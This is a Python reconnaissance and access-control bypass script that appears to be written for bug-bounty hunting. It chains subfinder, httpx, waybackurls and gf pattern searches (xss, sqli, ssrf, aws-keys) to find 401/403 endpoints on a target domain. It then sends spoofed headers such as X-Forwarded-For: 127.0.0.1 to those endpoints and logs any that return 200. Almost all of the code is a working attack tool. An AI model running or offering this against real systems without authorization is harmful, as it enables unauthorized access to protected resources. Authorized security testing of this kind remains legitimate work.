import subprocess
import sys
import requests
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ── config ────────────────────────────────────────────────────────────────────
BASE = Path(__file__).parent
RESOURCES = BASE / "resources"
SUBFINDER = RESOURCES / "subfinder.exe"
HTTPX     = RESOURCES / "httpx.exe"
WAYBACK   = RESOURCES / "waybackurls.exe"
GF        = "gf"
GF_PATTERNS = ["xss", "redirect", "ssrf", "sqli", "aws-keys", "s3-buckets", "firebase", "urls", "debug-pages", "base64", "sec", "takeovers"]

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"}, {"X-Forward-For": "127.0.0.1"}, {"X-Remote-IP": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"}, {"X-Remote-Addr": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"}, {"X-Forward-For": "localhost"}, {"X-Remote-IP": "localhost"}, {"X-Originating-IP": "localhost"}, {"X-Remote-Addr": "localhost"}, {"X-Client-IP": "localhost"},
    {"X-Forwarded-For": "192.168.0.1"}, {"X-Forward-For": "192.168.0.1"}, {"X-Remote-IP": "192.168.0.1"}, {"X-Originating-IP": "192.168.0.1"}, {"X-Remote-Addr": "192.168.0.1"}, {"X-Client-IP": "192.168.0.1"},
    {"X-Forwarded-For": "::1"}, {"X-Forward-For": "::1"}, {"X-Remote-IP": "::1"}, {"X-Originating-IP": "::1"}, {"X-Remote-Addr": "::1"}, {"X-Client-IP": "::1"}
]

BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
THREADS, HTTPX_T, HTTPX_RL, TIMEOUT = 20, 100, 500, 6

# ── thread-local sessions ─────────────────────────────────────────────────────
_thread_local = threading.local()
def get_thread_session() -> requests.Session:
    if not hasattr(_thread_local, "session"):
        retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retries, pool_connections=1, pool_maxsize=1)
        session = requests.Session()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        _thread_local.session = session
    return _thread_local.session

# ── helpers ───────────────────────────────────────────────────────────────────
def run_streaming(cmd, out_path: Path):
    count = 0
    with open(out_path, "w", encoding="utf-8") as f:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in proc.stdout:
            f.write(line)
            count += 1
            print(f"\r    {count} lines...", end="", flush=True)
        proc.wait()
    print(f"\r    done — {count} lines  →  {out_path.name}          ")
    return count

def write(path: Path, content: str):
    path.write_text(content, encoding="utf-8")
    lines = len(content.splitlines()) if content else 0
    print(f"    saved → {path.name}  ({lines} lines)")

def step(n, total, label):
    print(f"\n{'─'*60}\n  [{n}/{total}]  {label}\n{'─'*60}")

def dedupe_urls(urls: list) -> list:
    seen = set()
    return [seen.add(u.strip()) or u.strip() for u in urls if u.strip() and u.strip() not in seen]

def _write_stdin(proc, data: str):
    try:
        proc.stdin.write(data)
        proc.stdin.close()
    except Exception:
        pass

# ── bypass check ──────────────────────────────────────────────────────────────
def check_bypass(url: str) -> list:
    confirmed = []
    session = get_thread_session()
    try:
        baseline = session.get(url, headers={"User-Agent": BROWSER_UA}, timeout=TIMEOUT, allow_redirects=False)
        if baseline.status_code not in (401, 403):
            if baseline.status_code == 200:
                confirmed.append(f"[DRIFTED→200 no-payload] {url}  (was 401/403 at scan time, now openly 200 — worth manual check)")
            return confirmed
        baseline_code = baseline.status_code
    except Exception:
        return []

    for payload in BYPASS_HEADERS:
        try:
            r = session.get(url, headers={**payload, "User-Agent": BROWSER_UA}, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code == 200:
                confirmed.append(f"[CONFIRMED {baseline_code}→200] {url}  payload: {payload}")
        except Exception:
            continue
    return confirmed

def run_bypass_batch(urls: list, out_path: Path):
    total, all_confirmed = len(urls), []
    print(f"    testing {total} urls with {THREADS} concurrent threads...")
    executor = ThreadPoolExecutor(max_workers=THREADS)
    try:
        future_to_url = {executor.submit(check_bypass, url): url for url in urls}
        for i, future in enumerate(as_completed(future_to_url), 1):
            url = future_to_url[future]
            print(f"\r    [{i}/{total}]  {url[:55]}        ", end="", flush=True)
            try:
                findings = future.result()
                if findings:
                    print(f"\n    !! REAL FINDING: {url}")
                    all_confirmed.extend(findings)
            except Exception:
                continue
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted — shutting down workers...")
        executor.shutdown(wait=False, cancel_futures=True)
        if all_confirmed: write(out_path, "\n".join(all_confirmed))
        sys.exit(1)
    else:
        executor.shutdown(wait=True)
    print()
    if all_confirmed: print(f"\n    *** {len(all_confirmed)} CONFIRMED BYPASS(ES) FOUND ***")
    else: print("    no confirmed bypasses found")
    write(out_path, "\n".join(all_confirmed))

# ── sleep control ─────────────────────────────────────────────────────────────
def disable_sleep():
    subprocess.run(["powercfg", "/change", "standby-timeout-ac", "0"], capture_output=True)
    subprocess.run(["powercfg", "/change", "standby-timeout-dc", "0"], capture_output=True)
    print("  [~] Sleep disabled for this run")

def restore_sleep():
    subprocess.run(["powercfg", "/change", "standby-timeout-ac", "20"], capture_output=True)
    subprocess.run(["powercfg", "/change", "standby-timeout-dc", "5"],  capture_output=True)
    print("  [~] Sleep restored")

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) < 2:
        print("Usage: python findbypasses.py <domain>\nExample: python findbypasses.py bugcrowd.com")
        sys.exit(1)

    disable_sleep()

    try:
        domain = sys.argv[1].strip().lower()
        folder = BASE / domain.replace(".", "_")
        folder.mkdir(parents=True, exist_ok=True)
        print(f"\n  Target  : {domain}\n  Output  : {folder}")
        TOTAL = 7

        # 1. subdomains
        step(1, TOTAL, "subfinder → subdomains.txt")
        subdomains_file = folder / "subdomains.txt"
        run_streaming([str(SUBFINDER), "-d", domain, "-silent"], subdomains_file)
        subdomain_list = dedupe_urls(subdomains_file.read_text(encoding="utf-8").splitlines())
        print(f"    {len(subdomain_list)} subdomains found")

        # 2. subdomains → 403/401
        step(2, TOTAL, "httpx on subdomains → 403_401.txt")
        f401_file = folder / "403_401.txt"
        run_streaming([str(HTTPX), "-l", str(subdomains_file), "-mc", "401,403", "-t", str(HTTPX_T), "-rl", str(HTTPX_RL), "-silent"], f401_file)
        f401_urls = dedupe_urls(f401_file.read_text(encoding="utf-8").splitlines())
        print(f"    {len(f401_urls)} unique urls returned 401/403")

        # 3. bypass check on subdomains
        step(3, TOTAL, "bypass check on 403_401.txt → 403_401_authslicer.txt")
        if f401_urls: run_bypass_batch(f401_urls, folder / "403_401_authslicer.txt")
        else: print("    nothing to test, skipping"); write(folder / "403_401_authslicer.txt", "")

        # 4. waybackurls — stdin written in background thread to prevent deadlock
        step(4, TOTAL, "waybackurls (root + subdomains) → wayback.txt")
        wayback_file = folder / "wayback.txt"
        proc = subprocess.Popen(
            [str(WAYBACK)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, encoding="utf-8", errors="replace"
        )
        stdin_thread = threading.Thread(
            target=_write_stdin,
            args=(proc, "\n".join([domain] + subdomain_list)),
            daemon=True
        )
        stdin_thread.start()

        seen_wb, count = set(), 0
        with open(wayback_file, "w", encoding="utf-8") as f:
            for line in proc.stdout:
                line = line.strip()
                if not line or line in seen_wb: continue
                seen_wb.add(line)
                f.write(line + "\n")
                count += 1
                if count % 5000 == 0: print(f"\r    {count:,} unique urls collected...", end="", flush=True)
        proc.wait()
        stdin_thread.join()
        print(f"\r    done — {count:,} unique urls  →  wayback.txt          ")

        # 5. gf patterns
        step(5, TOTAL, "gf patterns on wayback.txt → wayback_gf.txt")
        gf_results = []
        for pattern in GF_PATTERNS:
            print(f"    gf {pattern:<20}", end="", flush=True)
            with open(wayback_file, "r", encoding="utf-8") as infile:
                result = subprocess.run([GF, pattern], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out = result.stdout.strip()
            if out:
                matches = len(out.splitlines())
                gf_results.extend([f"# ── {pattern} ({matches} matches) ──", out])
                print(f"{matches} matches")
            else: print("0 matches")
        write(folder / "wayback_gf.txt", "\n".join(gf_results))

        # 6. wayback → 403/401
        step(6, TOTAL, "httpx on wayback.txt → wayback_403_401.txt")
        wayback_f401_file = folder / "wayback_403_401.txt"
        run_streaming([str(HTTPX), "-l", str(wayback_file), "-mc", "401,403", "-t", str(HTTPX_T), "-rl", str(HTTPX_RL), "-silent"], wayback_f401_file)
        wb_f401_urls = dedupe_urls(wayback_f401_file.read_text(encoding="utf-8").splitlines())
        wayback_f401_file.write_text("\n".join(wb_f401_urls), encoding="utf-8")
        print(f"    {len(wb_f401_urls)} unique urls returned 401/403")

        # 7. bypass check on wayback 403/401
        step(7, TOTAL, "bypass check on wayback_403_401.txt → wayback_403_401_authslicer.txt")
        if wb_f401_urls: run_bypass_batch(wb_f401_urls, folder / "wayback_403_401_authslicer.txt")
        else: print("    nothing to test, skipping"); write(folder / "wayback_403_401_authslicer.txt", "")

        # ── summary ───────────────────────────────────────────────────────────
        print(f"\n{'═'*60}\n  ✓  Done.  Output → {folder}")
        total_confirmed = 0
        for fname in ["403_401_authslicer.txt", "wayback_403_401_authslicer.txt"]:
            fpath = folder / fname
            if fpath.exists():
                total_confirmed += len([l for l in fpath.read_text(encoding="utf-8").splitlines() if l.strip()])
        if total_confirmed: print(f"\n  *** {total_confirmed} CONFIRMED REAL FINDING(S) ***\n  Check *_authslicer.txt files for details.")
        else: print("  No confirmed bypasses found.")
        print(f"{'═'*60}\n")

    finally:
        restore_sleep()

if __name__ == "__main__":
    main()